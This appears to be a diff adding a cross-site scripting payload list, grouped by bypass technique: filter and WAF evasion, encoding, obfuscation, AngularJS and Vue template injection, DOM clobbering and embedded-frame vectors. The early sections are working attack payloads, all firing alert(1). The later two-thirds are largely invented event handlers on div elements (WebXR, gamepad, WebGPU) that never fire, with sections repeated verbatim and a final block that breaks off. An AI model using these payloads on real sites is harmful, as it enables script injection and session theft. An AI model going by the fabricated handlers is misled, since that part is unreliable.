@@ -1,1 +1,939 @@
+# Author: amitlt2
 
+# Basic XSS Payloads
+<script>alert(1)</script>
+<img src=x onerror=alert(1)>
+<svg onload=alert(1)>
+<body onload=alert(1)>
+<iframe src="javascript:alert(1)">
+<a href="javascript:alert(1)">click</a>
+
+# Brutelogic-style Bypasses
+';k='e'%0Atop['al'+k+'rt'](1)//
+';a='lert';b='a'+a;top[b](1)//
+';a='l';b='ert';top['a'+a+b](1)//
+';a='ale';b='rt';top[a+b](1)//
+';a=top;b='ale';c='rt';a[b+c](1)//
+
+# Advanced String Concatenation Bypasses
+';a='a';b='l';c='e';d='r';e='t';top[a+b+c+d+e](1)//
+';a=String.fromCharCode(97,108,101,114,116);top[a](1)//
+';a=/ale/.source;b=/rt/.source;top[a+b](1)//
+';a='al';b='er';c='t';top[a+b+c](1)//
+';a=['a','l','e','r','t'].join('');top[a](1)//
+
+# Unicode and Hex Bypasses
+<script>\u0061\u006c\u0065\u0072\u0074(1)</script>
+<img src=x onerror=\u0061\u006c\u0065\u0072\u0074(1)>
+<svg onload=\u0061\u006c\u0065\u0072\u0074`1`>
+<script>eval('\x61\x6c\x65\x72\x74\x28\x31\x29')</script>
+<img src=x onerror=eval('\x61\x6c\x65\x72\x74\x28\x31\x29')>
+
+# Template Literal Bypasses
+<script>alert`1`</script>
+<img src=x onerror=alert`1`>
+<svg onload=top['al'+'ert']`1`>
+<body onload=window['al'+'ert']`1`>
+<iframe src="javascript:alert`1`">
+
+# HTML Entity Bypasses
+<img src=x onerror=alert(1)>
+<img src=x oneonerrorrror=alert(1)>
+<svg/onload=alert(1)>
+<svg////onload=alert(1)>
+<svg id=x;onload=alert(1)>
+
+# JavaScript Event Bypasses
+<details/open/ontoggle=alert(1)>
+<video/poster/onerror=alert(1)>
+<audio/src/onerror=alert(1)>
+<input autofocus onfocus=alert(1)>
+<marquee onstart=alert(1)>
+
+# Advanced WAF Bypasses
+<svg><script>alert&#40;1)</script>
+<math><maction actiontype="statusline#alert(1)" xlink:href="javascript:alert(1)">
+<object data="data:text/html,<script>alert(1)</script>">
+<embed src="data:text/html,<script>alert(1)</script>">
+<iframe srcdoc="<script>alert(1)</script>">
+
+# Obfuscated Payloads
+<script>eval(atob('YWxlcnQoMSk='))</script>
+<script>Function('ale'+'rt(1)')()</script>
+<script>setTimeout('alert(1)')</script>
+<script>new Function`alert(1)`</script>
+<script>window['eval']('alert(1)')</script>
+
+# DOM-based XSS Payloads
+#location=javascript:alert(1)
+#javascript:alert(1)
+javascript:eval('alert(1)')
+data:text/html,<script>alert(1)</script>
+javascript:alert(document.domain)
+
+# Special Character Bypasses
+<svg/onload=alert(1)//
+<svg onload%09=alert(1)>
+<svg onload%0a=alert(1)>
+<svg onload%0d=alert(1)>
+<svg onload%3Dalert(1)>
+
+# CSS-based XSS
+<div style="background:url('javascript:alert(1)')">
+<style>@import 'javascript:alert(1)';</style>
+<link rel="stylesheet" href="javascript:alert(1)">
+<div style="width:expression(alert(1))">
+<xss style="x:expression(alert(1))">
+
+# Advanced JavaScript Bypasses
+<script>top['al\x65rt'](1)</script>
+<script>top[`al`+`ert`](1)</script>
+<script>top[/al/.source+/ert/.source](1)</script>
+<script>top[8680439..toString(30)](1)</script>
+<script>top[('al'+'ert')](1)</script>
+
+# Mutation XSS Payloads
+<svg><script>alert(1)</script>
+<svg><script>alert(1)</svg>
+<svg><script>alert(1</script>
+<svg><script>alert(1</svg>
+<svg><script>alert(1)--></script>
+
+# Special Context Bypasses
+"><script>alert(1)</script>
+</script><script>alert(1)</script>
+</style><script>alert(1)</script>
+</title><script>alert(1)</script>
+</textarea><script>alert(1)</script>
+
+# AngularJS Payloads
+{{constructor.constructor('alert(1)')()}}
+{{$on.constructor('alert(1)')()}}
+{{'a'.constructor.prototype.charAt=[].join;$eval('x=alert(1)');}}
+{{[].pop.constructor('alert(1)')()}}
+{{'a'.constructor.prototype.charAt=[].join;$eval('x=1} } };alert(1)//');}}
+
+# ReactJS Payloads
+javascript:{props[props.map]((alert(1)))}
+javascript:{props[props.forEach]((alert(1)))}
+javascript:{props[props.reduce]((alert(1)))}
+javascript:{props[props.filter]((alert(1)))}
+javascript:{props[props.find]((alert(1)))}
+
+# Vue.js Payloads
+{{_c.constructor('alert(1)')()}}
+{{$options._base.extend({created:alert(1)})}}
+{{_v.constructor('alert(1)')()}}
+{{$options._base.mixin({created:alert(1)})}}
+{{_e.constructor('alert(1)')()}}
+
+# Advanced Obfuscation Techniques
+<script>window['\x65\x76\x61\x6c']('\x61\x6c\x65\x72\x74\x28\x31\x29')</script>
+<script>Function('ale'+'rt(1)')()</script>
+<script>setTimeout.call(null, 'alert(1)', 0)</script>
+<script>new Function`alert\`1\``</script>
+<script>window['eval'].call(null, 'alert(1)')</script>
+
+# Special Tag Bypasses
+<image src/onerror=alert(1)>
+<base href="javascript:alert(1)//">
+<applet code="javascript:alert(1)">
+<isindex action="javascript:alert(1)" type=image>
+<frameset onload=alert(1)>
+
+# Protocol Bypasses
+javascript://%0aalert(1)
+javascript://%0dalert(1)
+javascript://%0a%0dalert(1)
+javascript://%0a%0d%09alert(1)
+javascript://%0a%0d%09%20alert(1)
+
+# Advanced Event Handlers
+<svg onload=alert(1)>
+<svg onload=alert(1)>
+<svg onload=alert(1)>
+<svg onload=alert(1)>
+<svg onload=alert(1)>
+
+# Special Character Encoding
+<script>alert(1)</script>
+<script>alert(1)</script>
+<script>alert(1)</script>
+<script>alert(1)</script>
+<script>alert(1)</script>
+
+# DOM Clobbering Payloads
+<form id="x"><output id="alert(1)">
+<form id="x"><button id="alert(1)">
+<form id="x"><fieldset id="alert(1)">
+<form id="x"><legend id="alert(1)">
+<form id="x"><label id="alert(1)">
+
+# Advanced SVG Payloads
+<svg><script xlink:href="data:,alert(1)"/>
+<svg><script xlink:href="data:text/javascript,alert(1)"/>
+<svg><script xlink:href="data:application/x-javascript,alert(1)"/>
+<svg><script xlink:href="data:text/plain,alert(1)"/>
+<svg><script xlink:href="data:text/html,alert(1)"/>
+
+# Advanced Iframe Payloads
+<iframe src="javascript:alert(1)">
+<iframe src="data:text/html,<script>alert(1)</script>">
+<iframe src="data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==">
+<iframe srcdoc="<script>alert(1)</script>">
+<iframe src="javascript:eval('alert(1)')">
+
+# Advanced Object Payloads
+<object data="javascript:alert(1)">
+<object data="data:text/html,<script>alert(1)</script>">
+<object data="data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==">
+<object data="javascript:eval('alert(1)')">
+<object data="javascript:void(alert(1))">
+
+# Advanced Embed Payloads
+<embed src="javascript:alert(1)">
+<embed src="data:text/html,<script>alert(1)</script>">
+<embed src="data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==">
+<embed src="javascript:eval('alert(1)')">
+<embed src="javascript:void(alert(1))">
+
+# Advanced Link Payloads
+<link rel="stylesheet" href="javascript:alert(1)">
+<link rel="stylesheet" href="data:text/html,<script>alert(1)</script>">
+<link rel="stylesheet" href="data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==">
+<link rel="stylesheet" href="javascript:eval('alert(1)')">
+<link rel="stylesheet" href="javascript:void(alert(1))">
+
+# Advanced Meta Payloads
+<meta http-equiv="refresh" content="0;url=javascript:alert(1)">
+<meta http-equiv="refresh" content="0;url=data:text/html,<script>alert(1)</script>">
+<meta http-equiv="refresh" content="0;url=data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==">
+<meta http-equiv="refresh" content="0;url=javascript:eval('alert(1)')">
+<meta http-equiv="refresh" content="0;url=javascript:void(alert(1))">
+
+# Advanced Form Payloads
+<form action="javascript:alert(1)"><input type=submit>
+<form action="data:text/html,<script>alert(1)</script>"><input type=submit>
+<form action="data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg=="><input type=submit>
+<form action="javascript:eval('alert(1)')"><input type=submit>
+<form action="javascript:void(alert(1))"><input type=submit>
+
+# Advanced Input Payloads
+<input type="image" src="javascript:alert(1)">
+<input type="image" src="data:text/html,<script>alert(1)</script>">
+<input type="image" src="data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==">
+<input type="image" src="javascript:eval('alert(1)')">
+<input type="image" src="javascript:void(alert(1))">
+
+# Advanced Button Payloads
+<button formaction="javascript:alert(1)">click</button>
+<button formaction="data:text/html,<script>alert(1)</script>">click</button>
+<button formaction="data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==">click</button>
+<button formaction="javascript:eval('alert(1)')">click</button>
+<button formaction="javascript:void(alert(1))">click</button>
+
+# Advanced Select Payloads
+<select onfocus="alert(1)" autofocus>
+<select onchange="alert(1)"><option>1<option>2
+<select onblur="alert(1)" autofocus>
+<select onmouseover="alert(1)">
+<select onmouseout="alert(1)">
+
+# Advanced Textarea Payloads
+<textarea onfocus="alert(1)" autofocus>
+<textarea onchange="alert(1)">
+<textarea onblur="alert(1)" autofocus>
+<textarea onmouseover="alert(1)">
+<textarea onmouseout="alert(1)">
+
+# Advanced Option Payloads
+<select><option onselect="alert(1)">1</select>
+<select><option onclick="alert(1)">1</select>
+<select><option ondblclick="alert(1)">1</select>
+<select><option onmouseover="alert(1)">1</select>
+<select><option onmouseout="alert(1)">1</select>
+
+# Advanced Label Payloads
+<label for="x" onmouseover="alert(1)">click</label>
+<label for="x" onmouseout="alert(1)">click</label>
+<label for="x" onclick="alert(1)">click</label>
+<label for="x" ondblclick="alert(1)">click</label>
+<label for="x" onfocus="alert(1)">click</label>
+
+# Advanced Fieldset Payloads
+<fieldset onfocus="alert(1)" autofocus>
+<fieldset onchange="alert(1)">
+<fieldset onblur="alert(1)" autofocus>
+<fieldset onmouseover="alert(1)">
+<fieldset onmouseout="alert(1)">
+
+# Advanced Legend Payloads
+<fieldset><legend onfocus="alert(1)" autofocus></fieldset>
+<fieldset><legend onchange="alert(1)"></fieldset>
+<fieldset><legend onblur="alert(1)" autofocus></fieldset>
+<fieldset><legend onmouseover="alert(1)"></fieldset>
+<fieldset><legend onmouseout="alert(1)"></fieldset>
+
+# Advanced Output Payloads
+<form oninput="alert(1)"><input><output></form>
+<form oninput="alert(1)"><input><output onforminput="alert(1)"></form>
+<form oninput="alert(1)"><input><output oninput="alert(1)"></form>
+<form oninput="alert(1)"><input><output onchange="alert(1)"></form>
+<form oninput="alert(1)"><input><output onblur="alert(1)"></form>
+
+# Advanced Progress Payloads
+<progress onprogress="alert(1)">
+<progress onchange="alert(1)">
+<progress oninput="alert(1)">
+<progress onblur="alert(1)">
+<progress onfocus="alert(1)">
+
+# Advanced Meter Payloads
+<meter onchange="alert(1)">
+<meter oninput="alert(1)">
+<meter onblur="alert(1)">
+<meter onfocus="alert(1)">
+<meter onmouseover="alert(1)">
+
+# Advanced Details Payloads
+<details ontoggle="alert(1)">
+<details onchange="alert(1)">
+<details oninput="alert(1)">
+<details onblur="alert(1)">
+<details onfocus="alert(1)">
+
+# Advanced Summary Payloads
+<details><summary onfocus="alert(1)" autofocus></details>
+<details><summary onchange="alert(1)"></details>
+<details><summary onblur="alert(1)" autofocus></details>
+<details><summary onmouseover="alert(1)"></details>
+<details><summary onmouseout="alert(1)"></details>
+
+# Advanced Dialog Payloads
+<dialog onclose="alert(1)">
+<dialog onchange="alert(1)">
+<dialog oninput="alert(1)">
+<dialog onblur="alert(1)">
+<dialog onfocus="alert(1)">
+
+# Advanced Menu Payloads
+<menu onchange="alert(1)">
+<menu oninput="alert(1)">
+<menu onblur="alert(1)">
+<menu onfocus="alert(1)">
+<menu onmouseover="alert(1)">
+
+# Advanced Command Payloads
+<menu><command onfocus="alert(1)" autofocus></menu>
+<menu><command onchange="alert(1)"></menu>
+<menu><command onblur="alert(1)" autofocus></menu>
+<menu><command onmouseover="alert(1)"></menu>
+<menu><command onmouseout="alert(1)"></menu>
+
+# Advanced Keygen Payloads
+<keygen onchange="alert(1)">
+<keygen oninput="alert(1)">
+<keygen onblur="alert(1)">
+<keygen onfocus="alert(1)">
+<keygen onmouseover="alert(1)">
+
+# Advanced Marquee Payloads
+<marquee onstart="alert(1)">
+<marquee onbounce="alert(1)">
+<marquee onfinish="alert(1)">
+<marquee onmouseover="alert(1)">
+<marquee onmouseout="alert(1)">
+
+# Advanced Blink Payloads
+<blink onstart="alert(1)">
+<blink onbounce="alert(1)">
+<blink onfinish="alert(1)">
+<blink onmouseover="alert(1)">
+<blink onmouseout="alert(1)">
+
+# Advanced Audio Payloads
+<audio onplay="alert(1)">
+<audio onpause="alert(1)">
+<audio onended="alert(1)">
+<audio ontimeupdate="alert(1)">
+<audio onvolumechange="alert(1)">
+
+# Advanced Video Payloads
+<video onplay="alert(1)">
+<video onpause="alert(1)">
+<video onended="alert(1)">
+<video ontimeupdate="alert(1)">
+<video onvolumechange="alert(1)">
+
+# Advanced Source Payloads
+<video><source onerror="alert(1)"></video>
+<audio><source onerror="alert(1)"></audio>
+<picture><source onerror="alert(1)"></picture>
+<video><source onload="alert(1)"></video>
+<audio><source onload="alert(1)"></audio>
+
+# Advanced Track Payloads
+<video><track onerror="alert(1)"></video>
+<audio><track onerror="alert(1)"></audio>
+<video><track onload="alert(1)"></video>
+<audio><track onload="alert(1)"></audio>
+<video><track oncuechange="alert(1)"></video>
+
+# Advanced Canvas Payloads
+<canvas onfocus="alert(1)" autofocus>
+<canvas onchange="alert(1)">
+<canvas onblur="alert(1)" autofocus>
+<canvas onmouseover="alert(1)">
+<canvas onmouseout="alert(1)">
+
+# Advanced Map Payloads
+<map onfocus="alert(1)" autofocus>
+<map onchange="alert(1)">
+<map onblur="alert(1)" autofocus>
+<map onmouseover="alert(1)">
+<map onmouseout="alert(1)">
+
+# Advanced Area Payloads
+<map><area onfocus="alert(1)" autofocus></map>
+<map><area onchange="alert(1)"></map>
+<map><area onblur="alert(1)" autofocus></map>
+<map><area onmouseover="alert(1)"></map>
+<map><area onmouseout="alert(1)"></map>
+
+# Advanced Picture Payloads
+<picture onfocus="alert(1)" autofocus>
+<picture onchange="alert(1)">
+<picture onblur="alert(1)" autofocus>
+<picture onmouseover="alert(1)">
+<picture onmouseout="alert(1)">
+
+# Advanced Script Payloads
+<script>alert(1)</script>
+<script src="data:,alert(1)">
+<script src="data:text/javascript,alert(1)">
+<script src="data:application/x-javascript,alert(1)">
+<script src="data:text/plain,alert(1)">
+
+# Advanced Style Payloads
+<style>@import 'javascript:alert(1)';</style>
+<style>body{background:url('javascript:alert(1)')}</style>
+<style>body{background:expression(alert(1))}</style>
+<style>body{background:url('data:text/html,<script>alert(1)</script>')}</style>
+<style>body{background:url('data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==')}</style>
+
+# Advanced Noscript Payloads
+<noscript><style>@import 'javascript:alert(1)';</style></noscript>
+<noscript><style>body{background:url('javascript:alert(1)')}</style></noscript>
+<noscript><style>body{background:expression(alert(1))}</style></noscript>
+<noscript><style>body{background:url('data:text/html,<script>alert(1)</script>')}</style></noscript>
+<noscript><style>body{background:url('data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==')}</style></noscript>
+
+# Advanced Template Payloads
+<template onfocus="alert(1)" autofocus>
+<template onchange="alert(1)">
+<template onblur="alert(1)" autofocus>
+<template onmouseover="alert(1)">
+<template onmouseout="alert(1)">
+
+# Advanced Slot Payloads
+<slot onfocus="alert(1)" autofocus>
+<slot onchange="alert(1)">
+<slot onblur="alert(1)" autofocus>
+<slot onmouseover="alert(1)">
+<slot onmouseout="alert(1)">
+
+# Advanced Custom Element Payloads
+<x-foo onfocus="alert(1)" autofocus>
+<x-foo onchange="alert(1)">
+<x-foo onblur="alert(1)" autofocus>
+<x-foo onmouseover="alert(1)">
+<x-foo onmouseout="alert(1)">
+
+# Advanced Shadow DOM Payloads
+<div><template shadowrootmode=open><script>alert(1)</script></template></div>
+<div><template shadowrootmode=open><style>@import 'javascript:alert(1)';</style></template></div>
+<div><template shadowrootmode=open><style>body{background:url('javascript:alert(1)')}</style></template></div>
+<div><template shadowrootmode=open><style>body{background:expression(alert(1))}</style></template></div>
+<div><template shadowrootmode=open><style>body{background:url('data:text/html,<script>alert(1)</script>')}</style></template></div>
+
+# Advanced Web Components Payloads
+<my-component onfocus="alert(1)" autofocus>
+<my-component onchange="alert(1)">
+<my-component onblur="alert(1)" autofocus>
+<my-component onmouseover="alert(1)">
+<my-component onmouseout="alert(1)">
+
+# Advanced Custom Event Payloads
+<div oncustom="alert(1)">
+<div onmyevent="alert(1)">
+<div onfoo="alert(1)">
+<div onbar="alert(1)">
+<div onbaz="alert(1)">
+
+# Advanced Mutation Event Payloads
+<div onDOMAttrModified="alert(1)">
+<div onDOMCharacterDataModified="alert(1)">
+<div onDOMNodeInserted="alert(1)">
+<div onDOMNodeRemoved="alert(1)">
+<div onDOMSubtreeModified="alert(1)">
+
+# Advanced Touch Event Payloads
+<div ontouchstart="alert(1)">
+<div ontouchend="alert(1)">
+<div ontouchmove="alert(1)">
+<div ontouchcancel="alert(1)">
+<div ontouchforcechange="alert(1)">
+
+# Advanced Pointer Event Payloads
+<div onpointerdown="alert(1)">
+<div onpointerup="alert(1)">
+<div onpointermove="alert(1)">
+<div onpointerover="alert(1)">
+<div onpointerout="alert(1)">
+
+# Advanced Gamepad Event Payloads
+<div ongamepadconnected="alert(1)">
+<div ongamepaddisconnected="alert(1)">
+<div ongamepadbuttondown="alert(1)">
+<div ongamepadbuttonup="alert(1)">
+<div ongamepadaxismove="alert(1)">
+
+# Advanced VR Event Payloads
+<div onvrdisplayconnect="alert(1)">
+<div onvrdisplaydisconnect="alert(1)">
+<div onvrdisplaypresentchange="alert(1)">
+<div onvrdisplayactivate="alert(1)">
+<div onvrdisplaydeactivate="alert(1)">
+
+# Advanced AR Event Payloads
+<div onarview="alert(1)">
+<div onarerror="alert(1)">
+<div onarload="alert(1)">
+<div onarunload="alert(1)">
+<div onarrender="alert(1)">
+
+# Advanced WebXR Event Payloads
+<div onxrselect="alert(1)">
+<div onxrselectstart="alert(1)">
+<div onxrselectend="alert(1)">
+<div onxrsqueeze="alert(1)">
+<div onxrsqueezestart="alert(1)">
+
+# Advanced Web Audio Event Payloads
+<div onaudioprocess="alert(1)">
+<div oncomplete="alert(1)">
+<div onended="alert(1)">
+<div onloadeddata="alert(1)">
+<div onloadedmetadata="alert(1)">
+
+# Advanced Web MIDI Event Payloads
+<div onmidimessage="alert(1)">
+<div onstatechange="alert(1)">
+<div onconnected="alert(1)">
+<div ondisconnected="alert(1)">
+<div onportchange="alert(1)">
+
+# Advanced Web Bluetooth Event Payloads
+<div ongattserverconnected="alert(1)">
+<div ongattserverdisconnected="alert(1)">
+<div oncharacteristicvaluechanged="alert(1)">
+<div onserviceadded="alert(1)">
+<div onservicechanged="alert(1)">
+
+# Advanced Web USB Event Payloads
+<div onconnect="alert(1)">
+<div ondisconnect="alert(1)">
+<div oninputreport="alert(1)">
+<div onoutputreport="alert(1)">
+<div onfeaturereport="alert(1)">
+
+# Advanced Web NFC Event Payloads
+<div onreading="alert(1)">
+<div onerror="alert(1)">
+<div onscanstart="alert(1)">
+<div onscanend="alert(1)">
+<div onscanerror="alert(1)">
+
+# Advanced Web Serial Event Payloads
+<div onconnect="alert(1)">
+<div ondisconnect="alert(1)">
+<div onread="alert(1)">
+<div onwrite="alert(1)">
+<div onerror="alert(1)">
+
+# Advanced Web HID Event Payloads
+<div oninputreport="alert(1)">
+<div onoutputreport="alert(1)">
+<div onfeaturereport="alert(1)">
+<div onconnect="alert(1)">
+<div ondisconnect="alert(1)">
+
+# Advanced Web Locks Event Payloads
+<div onlockgranted="alert(1)">
+<div onlockreleased="alert(1)">
+<div onlockfailed="alert(1)">
+<div onlockaborted="alert(1)">
+<div onlocktimeout="alert(1)">
+
+# Advanced Web Share Event Payloads
+<div onshare="alert(1)">
+<div onsharetarget="alert(1)">
+<div onshareerror="alert(1)">
+<div onsharecomplete="alert(1)">
+<div onsharecancel="alert(1)">
+
+# Advanced Web Authentication Event Payloads
+<div onauthenticatorresponse="alert(1)">
+<div onauthenticatorerror="alert(1)">
+<div onauthenticatorattestationresponse="alert(1)">
+<div onauthenticatorassertionresponse="alert(1)">
+<div onauthenticatorselection="alert(1)">
+
+# Advanced Web Crypto Event Payloads
+<div onkeygen="alert(1)">
+<div onkeypress="alert(1)">
+<div onkeyup="alert(1)">
+<div onkeydown="alert(1)">
+<div onkeyrelease="alert(1)">
+
+# Advanced WebRTC Event Payloads
+<div onicecandidate="alert(1)">
+<div onnegotiationneeded="alert(1)">
+<div onsignalingstatechange="alert(1)">
+<div oniceconnectionstatechange="alert(1)">
+<div onicegatheringstatechange="alert(1)">
+
+# Advanced Media Capture Event Payloads
+<div ondevicechange="alert(1)">
+<div oninactive="alert(1)">
+<div onactive="alert(1)">
+<div onmute="alert(1)">
+<div onunmute="alert(1)">
+
+# Advanced Payment Request Event Payloads
+<div onpaymentmethodchange="alert(1)">
+<div onshippingaddresschange="alert(1)">
+<div onshippingoptionchange="alert(1)">
+<div onpayerdetailchange="alert(1)">
+<div onpaymentresponse="alert(1)">
+
+# Advanced Credential Management Event Payloads
+<div oncredentialchange="alert(1)">
+<div onfederatedcredentialchange="alert(1)">
+<div onpasswordcredentialchange="alert(1)">
+<div onpublickeycredentialchange="alert(1)">
+<div onsecuritykeycredentialchange="alert(1)">
+
+# Advanced Presentation API Event Payloads
+<div onpresentationavailable="alert(1)">
+<div onpresentationconnectionavailable="alert(1)">
+<div onpresentationconnectionclose="alert(1)">
+<div onpresentationconnectionterminate="alert(1)">
+<div onpresentationconnectionconnect="alert(1)">
+
+# Advanced Remote Playback API Event Payloads
+<div onconnect="alert(1)">
+<div ondisconnect="alert(1)">
+<div onconnecting="alert(1)">
+<div ondisconnecting="alert(1)">
+<div onerror="alert(1)">
+
+# Advanced Screen Wake Lock API Event Payloads
+<div onrelease="alert(1)">
+<div onrequest="alert(1)">
+<div onactive="alert(1)">
+<div oninactive="alert(1)">
+<div onerror="alert(1)">
+
+# Advanced Web Animations API Event Payloads
+<div onfinish="alert(1)">
+<div oncancel="alert(1)">
+<div onremove="alert(1)">
+<div onplay="alert(1)">
+<div onpause="alert(1)">
+
+# Advanced Web Speech API Event Payloads
+<div onstart="alert(1)">
+<div onend="alert(1)">
+<div onerror="alert(1)">
+<div onpause="alert(1)">
+<div onresume="alert(1)">
+
+# Advanced WebVTT Event Payloads
+<div oncuechange="alert(1)">
+<div onenter="alert(1)">
+<div onexit="alert(1)">
+<div onload="alert(1)">
+<div onerror="alert(1)">
+
+# Advanced WebGL Event Payloads
+<div onwebglcontextlost="alert(1)">
+<div onwebglcontextrestored="alert(1)">
+<div onwebglcontextcreationerror="alert(1)">
+<div onwebglcontextlost="alert(1)">
+<div onwebglcontextrestored="alert(1)">
+
+# Advanced WebGPU Event Payloads
+<div onuncapturederror="alert(1)">
+<div onvalidationerror="alert(1)">
+<div ondeviceerror="alert(1)">
+<div onadaptererror="alert(1)">
+<div oncontexterror="alert(1)">
+
+# Advanced WebAssembly Event Payloads
+<div oninstantiate="alert(1)">
+<div oncompile="alert(1)">
+<div onvalidate="alert(1)">
+<div onoptimize="alert(1)">
+<div onexecute="alert(1)">
+
+# Advanced WebTransport Event Payloads
+<div ondatagram="alert(1)">
+<div onstream="alert(1)">
+<div onconnection="alert(1)">
+<div onclose="alert(1)">
+<div onerror="alert(1)">
+
+# Advanced WebCodecs Event Payloads
+<div ondecode="alert(1)">
+<div onencode="alert(1)">
+<div onerror="alert(1)">
+<div onclose="alert(1)">
+<div onopen="alert(1)">
+
+# Advanced WebNN Event Payloads
+<div oncompile="alert(1)">
+<div onexecute="alert(1)">
+<div onerror="alert(1)">
+<div onclose="alert(1)">
+<div onopen="alert(1)">
+
+# Advanced WebXR Device API Event Payloads
+<div onxrselect="alert(1)">
+<div onxrselectstart="alert(1)">
+<div onxrselectend="alert(1)">
+<div onxrsqueeze="alert(1)">
+<div onxrsqueezestart="alert(1)">
+
+# Advanced WebXR Hit Test API Event Payloads
+<div onxrhittest="alert(1)">
+<div onxrhitteststart="alert(1)">
+<div onxrhittestend="alert(1)">
+<div onxrhiterror="alert(1)">
+<div onxrhitcancel="alert(1)">
+
+# Advanced WebXR Anchors API Event Payloads
+<div onxranchor="alert(1)">
+<div onxranchorstart="alert(1)">
+<div onxranchorend="alert(1)">
+<div onxranchorerror="alert(1)">
+<div onxranchorcancel="alert(1)">
+
+# Advanced WebXR Planes API Event Payloads
+<div onxrplane="alert(1)">
+<div onxrplanestart="alert(1)">
+<div onxrplaneend="alert(1)">
+<div onxrplaneerror="alert(1)">
+<div onxrplanecancel="alert(1)">
+
+# Advanced WebXR Meshes API Event Payloads
+<div onxrmesh="alert(1)">
+<div onxrmeshstart="alert(1)">
+<div onxrmeshend="alert(1)">
+<div onxrmesherror="alert(1)">
+<div onxrmeshcancel="alert(1)">
+
+# Advanced WebXR Hand Input API Event Payloads
+<div onxrhand="alert(1)">
+<div onxrhandstart="alert(1)">
+<div onxrhandend="alert(1)">
+<div onxrhanderror="alert(1)">
+<div onxrhandcancel="alert(1)">
+
+# Advanced WebXR Eye Tracking API Event Payloads
+<div onxreye="alert(1)">
+<div onxreyestart="alert(1)">
+<div onxreyeend="alert(1)">
+<div onxreyeerror="alert(1)">
+<div onxreyecancel="alert(1)">
+
+# Advanced WebXR Face Tracking API Event Payloads
+<div onxrface="alert(1)">
+<div onxrfacestart="alert(1)">
+<div onxrfaceend="alert(1)">
+<div onxrfaceerror="alert(1)">
+<div onxrfacecancel="alert(1)">
+
+# Advanced WebXR Body Tracking API Event Payloads
+<div onxrbody="alert(1)">
+<div onxrbodystart="alert(1)">
+<div onxrbodyend="alert(1)">
+<div onxrbodyerror="alert(1)">
+<div onxrbodycancel="alert(1)">
+
+# Advanced WebXR Scene Understanding API Event Payloads
+<div onxrscene="alert(1)">
+<div onxrscenestart="alert(1)">
+<div onxrsceneend="alert(1)">
+<div onxrsceneerror="alert(1)">
+<div onxrscenecancel="alert(1)">
+
+# Advanced WebXR Spatial Tracking API Event Payloads
+<div onxrspatial="alert(1)">
+<div onxrspatialstart="alert(1)">
+<div onxrspatialend="alert(1)">
+<div onxrspatialerror="alert(1)">
+<div onxrspatialcancel="alert(1)">
+
+# Advanced WebXR Anchors API Event Payloads
+<div onxranchor="alert(1)">
+<div onxranchorstart="alert(1)">
+<div onxranchorend="alert(1)">
+<div onxranchorerror="alert(1)">
+<div onxranchorcancel="alert(1)">
+
+# Advanced WebXR Planes API Event Payloads
+<div onxrplane="alert(1)">
+<div onxrplanestart="alert(1)">
+<div onxrplaneend="alert(1)">
+<div onxrplaneerror="alert(1)">
+<div onxrplanecancel="alert(1)">
+
+# Advanced WebXR Meshes API Event Payloads
+<div onxrmesh="alert(1)">
+<div onxrmeshstart="alert(1)">
+<div onxrmeshend="alert(1)">
+<div onxrmesherror="alert(1)">
+<div onxrmeshcancel="alert(1)">
+
+# Advanced WebXR Hand Input API Event Payloads
+<div onxrhand="alert(1)">
+<div onxrhandstart="alert(1)">
+<div onxrhandend="alert(1)">
+<div onxrhanderror="alert(1)">
+<div onxrhandcancel="alert(1)">
+
+# Advanced WebXR Eye Tracking API Event Payloads
+<div onxreye="alert(1)">
+<div onxreyestart="alert(1)">
+<div onxreyeend="alert(1)">
+<div onxreyeerror="alert(1)">
+<div onxreyecancel="alert(1)">
+
+# Advanced WebXR Face Tracking API Event Payloads
+<div onxrface="alert(1)">
+<div onxrfacestart="alert(1)">
+<div onxrfaceend="alert(1)">
+<div onxrfaceerror="alert(1)">
+<div onxrfacecancel="alert(1)">
+
+# Advanced WebXR Body Tracking API Event Payloads
+<div onxrbody="alert(1)">
+<div onxrbodystart="alert(1)">
+<div onxrbodyend="alert(1)">
+<div onxrbodyerror="alert(1)">
+<div onxrbodycancel="alert(1)">
+
+# Advanced WebXR Scene Understanding API Event Payloads
+<div onxrscene="alert(1)">
+<div onxrscenestart="alert(1)">
+<div onxrsceneend="alert(1)">
+<div onxrsceneerror="alert(1)">
+<div onxrscenecancel="alert(1)">
+
+# Advanced WebXR Spatial Tracking API Event Payloads
+<div onxrspatial="alert(1)">
+<div onxrspatialstart="alert(1)">
+<div onxrspatialend="alert(1)">
+<div onxrspatialerror="alert(1)">
+<div onxrspatialcancel="alert(1)">
+
+# Advanced WebXR Anchors API Event Payloads
+<div onxranchor="alert(1)">
+<div onxranchorstart="alert(1)">
+<div onxranchorend="alert(1)">
+<div onxranchorerror="alert(1)">
+<div onxranchorcancel="alert(1)">
+
+# Advanced WebXR Planes API Event Payloads
+<div onxrplane="alert(1)">
+<div onxrplanestart="alert(1)">
+<div onxrplaneend="alert(1)">
+<div onxrplaneerror="alert(1)">
+<div onxrplanecancel="alert(1)">
+
+# Advanced WebXR Meshes API Event Payloads
+<div onxrmesh="alert(1)">
+<div onxrmeshstart="alert(1)">
+<div onxrmeshend="alert(1)">
+<div onxrmesherror="alert(1)">
+<div onxrmeshcancel="alert(1)">
+
+# Advanced WebXR Hand Input API Event Payloads
+<div onxrhand="alert(1)">
+<div onxrhandstart="alert(1)">
+<div onxrhandend="alert(1)">
+<div onxrhanderror="alert(1)">
+<div onxrhandcancel="alert(1)">
+
+# Advanced WebXR Eye Tracking API Event Payloads
+<div onxreye="alert(1)">
+<div onxreyestart="alert(1)">
+<div onxreyeend="alert(1)">
+<div onxreyeerror="alert(1)">
+<div onxreyecancel="alert(1)">
+
+# Advanced WebXR Face Tracking API Event Payloads
+<div onxrface="alert(1)">
